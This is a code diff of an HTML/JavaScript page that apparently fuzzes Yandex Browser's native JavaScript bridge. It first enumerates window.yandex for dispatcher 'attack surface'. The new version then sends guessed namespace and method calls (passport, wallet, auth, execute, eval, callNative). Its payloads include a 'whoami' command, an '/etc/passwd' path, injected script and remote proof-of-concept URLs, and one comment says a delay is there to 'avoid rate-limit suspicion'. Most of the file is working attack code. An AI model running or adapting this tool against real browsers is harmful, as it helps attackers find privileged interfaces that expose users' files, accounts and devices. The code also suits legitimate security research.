@@ -1,200 +1,252 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Yandex Bridge Deep Probe & Fuzzer</title>
   <style>
     body {
-      font-family: system-ui, sans-serif;
-      background: #0e0e0e;
-      color: #e6e6e6;
+      font-family: Consolas, monospace;
+      background: #0d1117;
+      color: #c9d1d9;
+      margin: 0;
       padding: 20px;
+      line-height: 1.5;
     }
-    h1 {
-      margin: 0 0 8px 0;
-      font-size: 22px;
-    }
-    pre {
-      background: #111;
-      color: #0f0;
-      padding: 14px;
-      border-radius: 8px;
+    h1, h2 { color: #58a6ff; }
+    #log {
+      background: #161b22;
+      border: 1px solid #30363d;
+      padding: 16px;
+      height: 400px;
+      overflow-y: auto;
       white-space: pre-wrap;
-      word-break: break-word;
-      max-height: 70vh;
-      overflow: auto;
-    }
-    .meta {
       font-size: 13px;
-      opacity: 0.8;
-      margin-bottom: 10px;
+      margin: 16px 0;
+      border-radius: 6px;
     }
+    .success { color: #3fb950; }
+    .blocked  { color: #d18616; }
+    .error    { color: #f85149; }
+    .info     { color: #8b949e; }
+    button, input, textarea {
+      background: #21262d;
+      color: #c9d1d9;
+      border: 1px solid #30363d;
+      padding: 8px 12px;
+      border-radius: 6px;
+      margin: 4px;
+    }
+    button:hover { background: #30363d; cursor: pointer; }
+    button.primary { background: #238636; border-color: #238636; }
+    button.primary:hover { background: #2ea043; }
+    #controls { margin: 20px 0; }
+    table { border-collapse: collapse; width: 100%; margin: 16px 0; }
+    th, td { border: 1px solid #30363d; padding: 8px; text-align: left; }
+    th { background: #161b22; }
   </style>
 </head>
-
 <body>
-  <h1>Yandex Bridge Auto‑Extraction</h1>
-  <div class="meta">
-    Runs automatically on page load · timestamp:
-    <span id="ts"></span>
-  </div>
 
-  <pre id="out">Waiting for execution…</pre>
+<h1>Yandex Browser Bridge Probe & Method Fuzzer</h1>
+<p>Run this HTML file **inside Yandex Browser** (desktop or Android). It probes namespaces, tries common method names, and lets you call them manually.</p>
+
+<div id="controls">
+  <button class="primary" onclick="startFullProbe()">Start Full Auto Probe</button>
+  <button onclick="clearLog()">Clear Log</button>
+  <button onclick="exportResults()">Export Results</button>
+  <button onclick="loadPrevious()">Load Previous</button>
+
+  <h2>Manual Call</h2>
+  <input id="ns" placeholder="namespace" value="quarkNative" style="width:160px"/>
+  <input id="method" placeholder="method" value="getDeviceInfo" style="width:180px"/>
+  <textarea id="args" placeholder='JSON args, e.g. {"url":"https://example.com"}' rows="2" style="width:100%; max-width:600px;"></textarea>
+  <br/>
+  <button onclick="manualCall()">Send →</button>
+</div>
+
+<div id="log">[Probe ready — click "Start Full Auto Probe"]</div>
+
+<table id="summary">
+  <thead><tr><th>Namespace</th><th>Status</th><th>Details</th></tr></thead>
+  <tbody></tbody>
+</table>
 
 <script>
-(function () {
-  const outEl = document.getElementById("out");
-  document.getElementById("ts").textContent = String(Date.now());
+// ────────────────────────────────────────────────
+const namespaces = [
+  "securityEvents","mobileZen","mediaPlayer","audioDownloader",
+  "videoTranslation","publicFeature","passport","device",
+  "debug","addappter","profileMenu","prerender",
+  "boostTile","images","quarkNative",
+  // extra guesses
+  "browser","internal","native","yandex","core","extension",
+  "zen","turbo","pay","wallet","auth","sync","update",
+  "telemetry","metrics","crash","feedback","share","intent",
+  "storage","file","download","screenshot","clipboard",
+  "permissions","settings","theme","voice","search","tab"
+];
 
-  function log(s) {
-    outEl.textContent += s + "\n";
+const commonMethods = [
+  "__probe__","getMethods","listMethods","enumerate","getAvailableMethods",
+  "getInfo","info","version","ping","test","echo",
+  "getDeviceInfo","getSystemInfo","deviceInfo",
+  "download","save","open","execute","run","eval","callNative",
+  "getUserInfo","login","logout","isAuthorized",
+  "capture","screenshot","record",
+  "set","get","clear","remove"
+];
+
+const fuzzArgs = [
+  {},
+  { test: true },
+  { url: "https://raw.githubusercontent.com/nmochea/whoami/refs/heads/main/poc.mp3" },
+  { url: "https://raw.githubusercontent.com/nmochea/whoami/refs/heads/main/poc.txt" },
+  { cmd: "whoami" },
+  { code: "alert('hi')" },
+  { file: "/sdcard/poc.txt" },
+  { path: "/etc/passwd" },
+  null, undefined, [], "", 0, true, false
+];
+
+let results = {};
+
+// ────────────────────────────────────────────────
+function log(txt, cls = "info") {
+  const time = new Date().toLocaleTimeString();
+  const line = `[${time}] <span class="${cls}">${txt}</span>\n`;
+  document.getElementById("log").innerHTML += line;
+  document.getElementById("log").scrollTop = 1e9;
+}
+
+function clearLog() {
+  document.getElementById("log").innerHTML = "";
+}
+
+function updateSummary(ns, status, detail = "") {
+  const tbody = document.querySelector("#summary tbody");
+  let row = Array.from(tbody.rows).find(r => r.cells[0].textContent === ns);
+  if (!row) {
+    row = tbody.insertRow();
+    row.insertCell(0).textContent = ns;
+    row.insertCell(1);
+    row.insertCell(2);
+  }
+  row.cells[1].innerHTML = `<span class="${status.includes("sent") || status.includes("ok") ? "success" : status.includes("blocked") ? "blocked" : "error"}">${status}</span>`;
+  row.cells[2].textContent = detail;
+}
+
+// ────────────────────────────────────────────────
+function sendYandex(ns, method, args = {}) {
+  if (!window.yandex || typeof window.yandex.postMessage !== "function") {
+    return "error: window.yandex.postMessage not found";
   }
 
-  function safe(fn) {
-    try {
-      return fn();
-    } catch (e) {
-      return { __error: String(e) };
+  try {
+    window.yandex.postMessage({
+      namespace: ns,
+      method: method,
+      args: args
+    });
+    return "sent";
+  } catch (e) {
+    return `blocked: ${e.message || e}`;
+  }
+}
+
+// ────────────────────────────────────────────────
+async function probeNamespace(ns) {
+  log(`Probing namespace → ${ns}`, "info");
+  updateSummary(ns, "probing...");
+
+  const res = sendYandex(ns, "__probe__");
+  updateSummary(ns, res, res.includes("sent") ? "answered to __probe__" : "");
+
+  results[ns] = results[ns] || { probe: res, methods: {} };
+
+  // Try common methods
+  for (const m of commonMethods) {
+    if (m === "__probe__") continue;
+    const r = sendYandex(ns, m);
+    if (r === "sent") {
+      log(`  → ${m} → sent`, "success");
+      results[ns].methods[m] = "sent";
+      updateSummary(ns, "sent", `${m} responded`);
     }
   }
 
-  function isCallable(v) {
-    return typeof v === "function";
-  }
-
-  function looksLikeDispatcher(name, fn) {
-    return (
-      isCallable(fn) &&
-      /post|send|call|invoke|dispatch|message/i.test(name)
-    );
-  }
-
-  function probeCall(fn, ctx) {
-    try {
-      const r = fn.call(ctx);
-      if (r && typeof r.then === "function") return "promise";
-      return "sync";
-    } catch {
-      return "throws";
-    }
-  }
-
-  function extractYandexBridge() {
-    const results = {
-      callable: [],
-      dispatchers: [],
-      namespaces: [],
-      suspicious: [],
-      protoCallables: [],
-    };
-
-    let y;
-    try {
-      y = window.yandex;
-    } catch (e) {
-      log("[!] window.yandex inaccessible: " + e);
-      return results;
-    }
-
-    if (!y) {
-      log("[!] window.yandex not present");
-      return results;
-    }
-
-    log("[*] window.yandex detected");
-
-    // 1) Own keys (Proxy-aware)
-    const ownKeys = safe(() => Reflect.ownKeys(y)) || [];
-    log("[*] ownKeys: " + JSON.stringify(ownKeys));
-
-    for (const k of ownKeys) {
-      let v;
-      try {
-        v = y[k];
-      } catch (e) {
-        results.suspicious.push({ name: k, reason: "getter throws" });
-        continue;
-      }
-
-      if (isCallable(v)) {
-        const behavior = probeCall(v, y);
-        results.callable.push({ name: k, behavior });
-
-        if (looksLikeDispatcher(k, v)) {
-          results.dispatchers.push({ name: k, behavior });
-        }
-        continue;
-      }
-
-      if (v === undefined) {
-        results.namespaces.push({ name: k, type: "virtual namespace" });
-        continue;
-      }
-
-      if (typeof v === "object") {
-        results.suspicious.push({
-          name: k,
-          type: "object namespace",
-          keys: safe(() => Reflect.ownKeys(v)),
-        });
-      }
-    }
-
-    // 2) Prototype inspection
-    let proto;
-    try {
-      proto = Object.getPrototypeOf(y);
-    } catch {}
-
-    if (proto) {
-      const protoKeys = safe(() => Reflect.ownKeys(proto)) || [];
-      log("[*] protoKeys: " + JSON.stringify(protoKeys));
-
-      for (const k of protoKeys) {
-        let v;
-        try {
-          v = proto[k];
-        } catch {
-          continue;
-        }
-
-        if (isCallable(v)) {
-          const behavior = probeCall(v, y);
-          results.protoCallables.push({ name: k, behavior });
-
-          if (looksLikeDispatcher(k, v)) {
-            results.dispatchers.push({
-              name: k,
-              behavior,
-              source: "prototype",
-            });
-          }
-        }
+  // Light fuzzing on promising namespaces
+  if (res === "sent" || ns.includes("device") || ns.includes("native") || ns.includes("quark")) {
+    log(`  Fuzzing ${ns} ...`, "info");
+    for (const m of ["getInfo", "getDeviceInfo", "info", "version"]) {
+      for (const a of fuzzArgs) {
+        const r = sendYandex(ns, m, a);
+        if (r === "sent") log(`    ${m}(${JSON.stringify(a)}) → sent`, "success");
       }
     }
+  }
+}
 
-    return results;
+// ────────────────────────────────────────────────
+async function startFullProbe() {
+  clearLog();
+  log("Starting full probe...", "info");
+
+  for (const ns of namespaces) {
+    await probeNamespace(ns);
+    await new Promise(r => setTimeout(r, 80)); // avoid rate-limit suspicion
   }
 
-  log("[*] Starting Yandex bridge extraction…");
-  const results = extractYandexBridge();
+  log("Probe finished.", "success");
+  localStorage.setItem("yandexProbeResults", JSON.stringify(results));
+}
 
-  log("\n=== CALLABLE ROOT FUNCTIONS ===");
-  log(JSON.stringify(results.callable, null, 2));
+// ────────────────────────────────────────────────
+function manualCall() {
+  const ns = document.getElementById("ns").value.trim();
+  const method = document.getElementById("method").value.trim();
+  let args = {};
 
-  log("\n=== DISPATCHER CANDIDATES (REAL ATTACK SURFACE) ===");
-  log(JSON.stringify(results.dispatchers, null, 2));
+  try {
+    args = JSON.parse(document.getElementById("args").value || "{}");
+  } catch (e) {
+    log(`Bad JSON args: ${e.message}`, "error");
+    return;
+  }
 
-  log("\n=== VIRTUAL NAMESPACES (NOT CALLABLE) ===");
-  log(JSON.stringify(results.namespaces, null, 2));
+  const res = sendYandex(ns, method, args);
+  log(`Manual → ${ns}.${method}(${JSON.stringify(args)}) → ${res}`, res === "sent" ? "success" : "error");
+}
 
-  log("\n=== PROTOTYPE CALLABLES ===");
-  log(JSON.stringify(results.protoCallables, null, 2));
+// ────────────────────────────────────────────────
+function exportResults() {
+  const data = JSON.stringify(results, null, 2);
+  const blob = new Blob([data], {type: "application/json"});
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement("a");
+  a.href = url;
+  a.download = "probe.json";
+  a.click();
+  URL.revokeObjectURL(url);
+}
 
-  log("\n=== SUSPICIOUS OBJECTS ===");
-  log(JSON.stringify(results.suspicious, null, 2));
+function loadPrevious() {
+  const saved = localStorage.getItem("yandexProbeResults");
+  if (saved) {
+    results = JSON.parse(saved);
+    log("Loaded previous results from localStorage", "success");
+    for (const ns in results) {
+      const r = results[ns];
+      updateSummary(ns, r.probe, Object.keys(r.methods).length ? Object.keys(r.methods).join(", ") : "");
+    }
+  } else {
+    log("No previous results found", "info");
+  }
+}
 
-  log("\n[*] Extraction complete");
-})();
+// Auto-load previous if exists
+loadPrevious();
 </script>
+
 </body>
 </html>
